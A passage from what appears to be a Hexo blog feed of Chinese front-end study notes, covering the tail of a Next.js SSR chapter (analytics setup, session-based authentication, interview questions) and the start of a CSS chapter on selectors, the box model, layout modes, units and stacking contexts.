class="hljs-attr">display</span>: swap;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析工具集成</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// next.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">experimental</span>: &#123;<br>    <span class="hljs-attr">instrumentationHook</span>: <span class="hljs-literal">true</span>,<br>  &#125;,<br>&#125;;<br><br><span class="hljs-comment">// instrumentation.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;@vercel/analytics&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">&#123; inject &#125;</span>) =&gt;</span> &#123;<br>      <span class="hljs-title function_">inject</span>();<br>    &#125;);<br>    <br>    <span class="hljs-keyword">const</span> &#123; init &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@sentry/nextjs&#x27;</span>);<br>    <span class="hljs-title function_">init</span>(&#123;<br>      <span class="hljs-attr">dsn</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">SENTRY_DSN</span>,<br>      <span class="hljs-attr">tracesSampleRate</span>: <span class="hljs-number">0.1</span>,<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="面试高频问题"><a href="#面试高频问题" class="headerlink" title="面试高频问题"></a>面试高频问题</h3><p><strong>Q：SSR 与 CSR 如何选择？</strong></p><ul><li>选择 SSR 当：<ul><li>SEO 是关键需求（内容型网站）</li><li>首屏性能至关重要</li><li>社交媒体分享需要正确预览</li></ul></li><li>选择 CSR 当：<ul><li>应用是认证后使用（后台系统）</li><li>高度交互式应用（如 Figma）</li><li>对服务器成本敏感</li></ul></li></ul><p><strong>Q：getStaticProps vs getServerSideProps</strong></p><p>对比：</p><table><thead><tr><th align="left">特性</th><th align="left">getStaticProps</th><th align="left">getServerSideProps</th></tr></thead><tbody><tr><td align="left">运行时机</td><td align="left">构建时</td><td align="left">每次请求时</td></tr><tr><td align="left">数据新鲜度</td><td align="left">静态（可重新验证）</td><td align="left">实时动态</td></tr><tr><td align="left">性能</td><td align="left">极快（CDN 缓存）</td><td align="left">较慢（服务器处理）</td></tr><tr><td align="left">SEO</td><td align="left">优</td><td align="left">优</td></tr><tr><td align="left">使用场景</td><td align="left">博客、产品目录</td><td align="left">个性化页面、仪表盘</td></tr></tbody></table><p><strong>Q：如何处理 SSR 中的身份认证？</strong></p><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 getServerSideProps 传递用户数据</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getServerSideProps</span>(<span class="hljs-params">context</span>) &#123;<br>  <span class="hljs-keyword">const</span> session = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getSession</span>(context);<br>  <br>  <span class="hljs-keyword">if</span> (!session) &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">redirect</span>: &#123; <span class="hljs-attr">destination</span>: <span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-attr">permanent</span>: <span class="hljs-literal">false</span> &#125;<br>    &#125;;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">user</span>: session.<span class="hljs-property">user</span> &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 客户端使用共享状态</span><br><span class="hljs-keyword">import</span> &#123; useSession &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next-auth/react&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">data</span>: session &#125; = <span class="hljs-title function_">useSession</span>();<br>  <br>  <span class="hljs-keyword">if</span> (session) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Welcome &#123;session.user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Please sign in<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：如何优化大型 Next.js 应用性能？</strong></p><p>优化策略：</p><ul><li>代码分割：使用动态导入拆分代码</li><li>图像优化：使用 Next Image 组件</li><li>CDN 缓存：配置静态资源和 ISR 页面缓存</li><li>数据库优化：使用缓存层（Redis&#x2F;Memcached）</li><li>减少 Bundle 大小：分析并优化依赖</li><li>服务端缓存：对 SSR 结果进行短期缓存</li><li>边缘计算：使用 Edge Functions 处理请求</li></ul><h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><ul><li>SSR 核心价值：<ul><li>提升 SEO 和首屏性能</li><li>改善社交分享体验</li><li>支持低端设备用户</li></ul></li><li>Next.js 核心能力：<ul><li>文件系统路由</li><li>混合渲染策略（SSG&#x2F;SSR&#x2F;ISR）</li><li>内置图像优化</li><li>API 路由支持</li></ul></li><li>关键数据获取方法：<ul><li>getStaticProps：构建时获取数据</li><li>getServerSideProps：请求时获取数据</li><li>getStaticPaths：定义动态路由</li></ul></li><li>高级特性：<ul><li>中间件：请求处理管道</li><li>按需重新验证：内容更新后刷新</li><li>分析工具：性能监控</li></ul></li><li>面试重点：<ul><li>渲染策略选择依据</li><li>身份认证实现方案</li><li>性能优化手段</li><li>部署架构设计</li></ul></li></ul><h1 id="第七章：React-工程化与优化"><a href="#第七章：React-工程化与优化" class="headerlink" title="第七章：React 工程化与优化"></a>第七章：React 工程化与优化</h1><h2 id="7-1-组件设计模式（复合组件、受控组件模式）"><a href="#7-1-组件设计模式（复合组件、受控组件模式）" class="headerlink" title="7.1 组件设计模式（复合组件、受控组件模式）"></a>7.1 组件设计模式（复合组件、受控组件模式）</h2><h2 id="7-2-样式方案（CSS-Modules、Styled-Components、Tailwind-CSS）"><a href="#7-2-样式方案（CSS-Modules、Styled-Components、Tailwind-CSS）" class="headerlink" title="7.2 样式方案（CSS Modules、Styled Components、Tailwind CSS）"></a>7.2 样式方案（CSS Modules、Styled Components、Tailwind CSS）</h2><h2 id="7-3-测试（Jest-React-Testing-Library）"><a href="#7-3-测试（Jest-React-Testing-Library）" class="headerlink" title="7.3 测试（Jest + React Testing Library）"></a>7.3 测试（Jest + React Testing Library）</h2><h2 id="7-4-性能优化（React-Profiler、减少重渲染）"><a href="#7-4-性能优化（React-Profiler、减少重渲染）" class="headerlink" title="7.4 性能优化（React Profiler、减少重渲染）"></a>7.4 性能优化（React Profiler、减少重渲染）</h2><h2 id="7-5-构建工具（Webpack-配置、Vite-优化）"><a href="#7-5-构建工具（Webpack-配置、Vite-优化）" class="headerlink" title="7.5 构建工具（Webpack 配置、Vite 优化）"></a>7.5 构建工具（Webpack 配置、Vite 优化）</h2><h1 id="第八章：React-18-新特性与未来趋势"><a href="#第八章：React-18-新特性与未来趋势" class="headerlink" title="第八章：React 18 新特性与未来趋势"></a>第八章：React 18 新特性与未来趋势</h1><h2 id="8-1-Concurrent-Mode（并发渲染）"><a href="#8-1-Concurrent-Mode（并发渲染）" class="headerlink" title="8.1 Concurrent Mode（并发渲染）"></a>8.1 Concurrent Mode（并发渲染）</h2><h2 id="8-2-自动批处理（Automatic-Batching）"><a href="#8-2-自动批处理（Automatic-Batching）" class="headerlink" title="8.2 自动批处理（Automatic Batching）"></a>8.2 自动批处理（Automatic Batching）</h2><h2 id="8-3-Transition-API（startTransition）"><a href="#8-3-Transition-API（startTransition）" class="headerlink" title="8.3 Transition API（startTransition）"></a>8.3 Transition API（startTransition）</h2><h2 id="8-4-Server-Components（服务端组件）"><a href="#8-4-Server-Components（服务端组件）" class="headerlink" title="8.4 Server Components（服务端组件）"></a>8.4 Server Components（服务端组件）</h2><h2 id="8-5-React-生态趋势（RSC、React-Native）"><a href="#8-5-React-生态趋势（RSC、React-Native）" class="headerlink" title="8.5 React 生态趋势（RSC、React Native）"></a>8.5 React 生态趋势（RSC、React Native）</h2>]]></content>
    
    
    <categories>
      
      <category>React</category>
      
    </categories>
    
    
    <tags>
      
      <tag>React</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSS 专题知识学习</title>
    <link href="/2025/06/22/CSS%20Study%20Notes/"/>
    <url>/2025/06/22/CSS%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章：CSS-基础与核心概念"><a href="#第一章：CSS-基础与核心概念" class="headerlink" title="第一章：CSS 基础与核心概念"></a>第一章：CSS 基础与核心概念</h1><h2 id="1-1-CSS-语法与选择器（基础选择器、组合选择器、属性选择器）"><a href="#1-1-CSS-语法与选择器（基础选择器、组合选择器、属性选择器）" class="headerlink" title="1.1 CSS 语法与选择器（基础选择器、组合选择器、属性选择器）"></a>1.1 CSS 语法与选择器（基础选择器、组合选择器、属性选择器）</h2><h3 id="基础语法结构"><a href="#基础语法结构" class="headerlink" title="基础语法结构"></a>基础语法结构</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 标准规则 */</span><br>selector &#123;<br>  property: value; <span class="hljs-comment">/* 声明块 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="基础选择器"><a href="#基础选择器" class="headerlink" title="基础选择器"></a>基础选择器</h3><p><strong>元素选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">color</span>: red; &#125;<br></code></pre></td></tr></table></figure><ul><li>权重：0,0,1</li><li>适用场景：全局样式覆盖</li></ul><p><strong>类选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.active</span> &#123; <span class="hljs-attribute">background</span>: blue; &#125;<br></code></pre></td></tr></table></figure><ul><li>权重：0,1,0</li><li>实践：BEM命名规范（block__element–modifier）</li></ul><span id="more"></span><p><strong>ID 选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-id">#header</span> &#123; <span class="hljs-attribute">height</span>: <span class="hljs-number">60px</span>; &#125;<br></code></pre></td></tr></table></figure><ul><li>权重：1,0,0</li><li>禁用场景：React&#x2F;Vue中易导致样式污染（组件化开发慎用）</li></ul><p><strong>通配选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS">* &#123; <span class="hljs-attribute">box-sizing</span>: border-box; &#125;<br></code></pre></td></tr></table></figure><ul><li>权重：0,0,0</li><li>性能影响：大型项目避免过度使用</li></ul><h3 id="组合选择器"><a href="#组合选择器" class="headerlink" title="组合选择器"></a>组合选择器</h3><p><strong>后代选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">a</span> &#123; <span class="hljs-attribute">color</span>: green; &#125; <span class="hljs-comment">/* 所有层级后代 */</span><br></code></pre></td></tr></table></figure><ul><li>权重：各选择器权重相加</li><li>性能陷阱：深层嵌套增加渲染成本（建议限制 3 层）</li></ul><p><strong>子选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">ul</span> &gt; <span class="hljs-selector-tag">li</span> &#123; <span class="hljs-attribute">list-style</span>: none; &#125; <span class="hljs-comment">/* 仅直接子元素 */</span><br></code></pre></td></tr></table></figure><ul><li>与后代选择器区别：不匹配非直接嵌套元素</li></ul><p><strong>相邻兄弟选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">h1</span> + <span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>; &#125; <span class="hljs-comment">/* 紧邻的下一个兄弟 */</span><br></code></pre></td></tr></table></figure><ul><li>典型场景：表单元素间隔控制</li></ul><p><strong>通用兄弟选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">h2</span> ~ <span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: gray; &#125; <span class="hljs-comment">/* 后续所有同级兄弟 */</span><br></code></pre></td></tr></table></figure><ul><li>应用案例：目录标题与内容样式关联</li></ul><h3 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h3><table><thead><tr><th align="left">选择器类型</th><th align="left">示例</th><th align="left">匹配规则</th><th align="left">权重</th></tr></thead><tbody><tr><td align="left">[attr]</td><td align="left">[target]</td><td align="left">存在该属性即可</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr&#x3D;value]</td><td align="left">[lang&#x3D;”en”]</td><td align="left">属性值完全匹配</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr~&#x3D;value]</td><td align="left">[class~&#x3D;”logo”]</td><td align="left">属性值包含该词（空格分隔）</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr&#x3D;value]</td><td align="left">[lang&#x3D;”zh”]</td><td align="left">属性值为zh或以zh-开头</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr^&#x3D;value]</td><td align="left">[href^&#x3D;”https”]</td><td align="left">属性值以指定字符串开头</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr$&#x3D;value]</td><td align="left">[src$&#x3D;”.png”]</td><td align="left">属性值以指定字符串结尾</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr*&#x3D;value]</td><td align="left">[data*&#x3D;”error”]</td><td align="left">属性值包含子字符串</td><td align="left">0,1,0</td></tr></tbody></table><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p><strong>Q：<code>.nav li &gt; a</code> 和 <code>.nav &gt; li &gt; a</code> 的权重与作用域差异？</strong></p><p>权重相同（0,2,1），但后者限制 <code>li</code> 必须为 <code>.nav</code> 的直接子元素</p><p><strong>Q：<code>div:not([class])</code> 会匹配哪些元素？</strong></p><p>所有没有 class 属性的 div 元素</p><h2 id="1-2-盒模型（标准盒模型-vs-怪异盒模型）"><a href="#1-2-盒模型（标准盒模型-vs-怪异盒模型）" class="headerlink" title="1.2 盒模型（标准盒模型 vs. 怪异盒模型）"></a>1.2 盒模型（标准盒模型 vs. 怪异盒模型）</h2><h3 id="核心概念对比"><a href="#核心概念对比" class="headerlink" title="核心概念对比"></a>核心概念对比</h3><table><thead><tr><th align="left">特性</th><th align="left">标准盒模型（W3C）</th><th align="left">怪异盒模型（Quirks Mode）</th></tr></thead><tbody><tr><td align="left">触发条件</td><td align="left">box-sizing: content-box</td><td align="left">box-sizing: border-box</td></tr><tr><td align="left">宽度计算</td><td align="left">width &#x3D; content宽度</td><td align="left">width &#x3D; content + padding + border</td></tr><tr><td align="left">高度计算</td><td align="left">height &#x3D; content高度</td><td align="left">height &#x3D; content + padding + border</td></tr><tr><td align="left">默认场景</td><td align="left">现代浏览器默认模式</td><td align="left">传统IE5及更早浏览器</td></tr></tbody></table><h3 id="代码验证"><a href="#代码验证" class="headerlink" title="代码验证"></a>代码验证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;std-box&quot;&gt;标准盒模型&lt;/div&gt;<br>&lt;div class=&quot;weird-box&quot;&gt;怪异盒模型&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.std-box</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: content-box; <span class="hljs-comment">/* 默认值可省略 */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">5px</span> solid red;<br>  <span class="hljs-comment">/* 实际占用宽度：100 + 20*2 + 5*2 = 150px */</span><br>&#125;<br><br><span class="hljs-selector-class">.weird-box</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: border-box;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">5px</span> solid blue;<br>  <span class="hljs-comment">/* 实际占用宽度：100px (content自动压缩为50px) */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h3><p><strong>Q：为什么大型项目普遍采用 <code>border-box</code>？</strong></p><ul><li>开发体验优化：轻松实现栅格化布局，无需计算 padding</li><li>性能优势：减少重排计算（浏览器无需重新计算内容区尺寸）</li><li>设计系统适配：确保 UI 标注尺寸与实际渲染尺寸一致</li></ul><h2 id="1-3-布局模式（块级、行内、行内块、Flex、Grid）"><a href="#1-3-布局模式（块级、行内、行内块、Flex、Grid）" class="headerlink" title="1.3 布局模式（块级、行内、行内块、Flex、Grid）"></a>1.3 布局模式（块级、行内、行内块、Flex、Grid）</h2><h3 id="块级布局（Block）"><a href="#块级布局（Block）" class="headerlink" title="块级布局（Block）"></a>块级布局（Block）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: block;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>独占一行，默认宽度撑满父容器</li><li>可设置宽高&#x2F;margin&#x2F;padding所有方向</li><li>典型元素：<code>&lt;div&gt;</code>、<code>&lt;p&gt;</code>、<code>&lt;section&gt;</code></li></ul><h3 id="行内布局（Inline）"><a href="#行内布局（Inline）" class="headerlink" title="行内布局（Inline）"></a>行内布局（Inline）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: inline;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>不独占一行，宽度由内容决定</li><li>不可设置宽高，垂直方向的 margin&#x2F;padding 不生效</li><li>典型元素：<code>&lt;span&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;em&gt;</code></li></ul><h3 id="行内块布局（Inline-block）"><a href="#行内块布局（Inline-block）" class="headerlink" title="行内块布局（Inline-block）"></a>行内块布局（Inline-block）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: inline-block;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>不独占一行但可以设置宽高（兼具块级布局和行内布局特性）</li><li>默认基线对齐（引发经典垂直对齐问题）</li></ul><p><strong>思考</strong></p><ul><li>如何消除行内块元素间隙：父容器font-size: 0或HTML代码无空格</li><li>垂直对齐控制：vertical-align: middle&#x2F;top&#x2F;bottom</li></ul><h3 id="Flex布局"><a href="#Flex布局" class="headerlink" title="Flex布局"></a>Flex布局</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: flex;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>主轴&#x2F;交叉轴双轴控制</li><li>子项弹性伸缩（flex-grow&#x2F;shrink&#x2F;basis）</li></ul><p><strong>思考</strong></p><ul><li>实现等高布局：<code>align-items: stretch</code></li><li>圣杯布局：<code>flex: 1</code> + <code>order</code> 属性</li><li>性能优化：避免过度嵌套</li></ul><p><strong>实战实例</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>; <span class="hljs-comment">/* 替代margin方案 */</span><br>&#125;<br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-built_in">calc</span>(<span class="hljs-number">33.33%</span> - <span class="hljs-number">10px</span>); <span class="hljs-comment">/* 三栏自适应 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Grid网格布局"><a href="#Grid网格布局" class="headerlink" title="Grid网格布局"></a>Grid网格布局</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: grid;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>二维布局系统（行列显式定义）</li><li>网格线&#x2F;网格区域命名控制</li></ul><h3 id="渲染性能排序"><a href="#渲染性能排序" class="headerlink" title="渲染性能排序"></a>渲染性能排序</h3><p>Block &gt; Flex ≈ Grid &gt; Inline-block（复合层创建成本）</p><h2 id="1-4-常用单位（px、em、rem、vw-vh、-）"><a href="#1-4-常用单位（px、em、rem、vw-vh、-）" class="headerlink" title="1.4 常用单位（px、em、rem、vw&#x2F;vh、%）"></a>1.4 常用单位（px、em、rem、vw&#x2F;vh、%）</h2><h3 id="绝对单位与相对单位的对比"><a href="#绝对单位与相对单位的对比" class="headerlink" title="绝对单位与相对单位的对比"></a>绝对单位与相对单位的对比</h3><table><thead><tr><th align="left">单位类型</th><th align="left">代表单位</th><th align="left">基准参照物</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">绝对单位</td><td align="left">px</td><td align="left">设备物理像素</td><td align="left">边框&#x2F;阴影等固定尺寸</td></tr><tr><td align="left">相对单位</td><td align="left">em&#x2F;rem</td><td align="left">字体大小&#x2F;根字体大小</td><td align="left">响应式文本&#x2F;组件间距</td></tr><tr><td align="left">视口单位</td><td align="left">vw&#x2F;vh</td><td align="left">视窗宽高</td><td align="left">全屏布局&#x2F;自适应元素</td></tr><tr><td align="left">百分比</td><td align="left">%</td><td align="left">父元素对应属性值</td><td align="left">流式布局&#x2F;继承比例</td></tr></tbody></table><h3 id="核心单位详解"><a href="#核心单位详解" class="headerlink" title="核心单位详解"></a>核心单位详解</h3><p><strong>px（像素）</strong></p><ul><li>本质：与设备物理像素挂钩（但受 DPR 影响）</li><li>陷阱：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">2px</span>; <span class="hljs-comment">/* 高清屏可能实际渲染为4物理像素 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>em</strong></p><ul><li>计算规则：<code>1em = 当前元素 font-size</code></li><li>级联问题：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS">&lt;<span class="hljs-selector-tag">div</span> class=&quot;parent&quot; style=&quot;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span><span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">  &lt;div class=&quot;</span>child<span class="hljs-string">&quot; style=&quot;</span>font-size: <span class="hljs-number">1.2em</span><span class="hljs-string">&quot;&gt; &lt;!-- 24px --&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;</span>grandchild<span class="hljs-string">&quot; style=&quot;</span>width: <span class="hljs-number">2em</span><span class="hljs-string">&quot;&gt; &lt;!-- 48px (!) --&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">  &lt;/div&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>rem（Root em）</strong></p><ul><li>计算规则：<code>1rem = 根元素 font-size</code></li></ul><p><strong>vw&#x2F;vh（视口单位）</strong></p><ul><li>计算规则：<code>1vw = 视口宽度的 1%</code>，<code>1vh = 视口高度的 1%</code></li><li>陷阱：移动端vh包含浏览器工具栏区域（可用dvh单位解决）</li></ul><p><strong>%（百分比）</strong></p><ul><li><p>参照基准：</p><table><thead><tr><th align="left">属性</th><th align="left">参照对象</th></tr></thead><tbody><tr><td align="left">width&#x2F;height</td><td align="left">父元素的内容区宽度&#x2F;高度</td></tr><tr><td align="left">padding&#x2F;margin</td><td align="left">父元素的内容区宽度</td></tr><tr><td align="left">top&#x2F;left</td><td align="left">包含块的高度&#x2F;宽度</td></tr></tbody></table></li><li><p>经典面试题</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10%</span>;<br>&#125;<br><span class="hljs-comment">/* 实际padding值为20px（基于父元素width计算） */</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-5-层叠与继承（z-index、-important、继承规则）"><a href="#1-5-层叠与继承（z-index、-important、继承规则）" class="headerlink" title="1.5 层叠与继承（z-index、!important、继承规则）"></a>1.5 层叠与继承（z-index、!important、继承规则）</h2><h3 id="层叠上下文的核心原理"><a href="#层叠上下文的核心原理" class="headerlink" title="层叠上下文的核心原理"></a>层叠上下文的核心原理</h3><p><strong>形成条件（触发 BFC 的升级版）</strong></p><ul><li>position: relative&#x2F;absolute&#x2F;fixed + z-index ≠ auto</li><li>opacity &lt; 1</li><li>transform&#x2F;filter 非 none</li><li>flex&#x2F;grid容器的子项且z-index ≠ auto</li></ul><p><strong>黄金规则</strong></p><ul><li>每个层叠上下文自成体系（内部 z-index 仅在该上下文中比较）</li><li>兄弟元素按 z-index 数值排序</li><li>不同上下文的比较取决于父级层叠上下文的层级</li></ul><p><strong>示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div style=&quot;position: relative; z-index: 1;&quot;&gt;<br>  &lt;div style=&quot;position: absolute; z-index: 100;&quot;&gt;A&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;div style=&quot;position: relative; z-index: 2;&quot;&gt;<br>  &lt;div style=&quot;position: absolute; z-index: 1;&quot;&gt;B&lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>最终显示顺序：B 覆盖 A（父级上下文 z-index: 2 &gt; 1）</p><h3 id="important-终极权重"><a href="#important-终极权重" 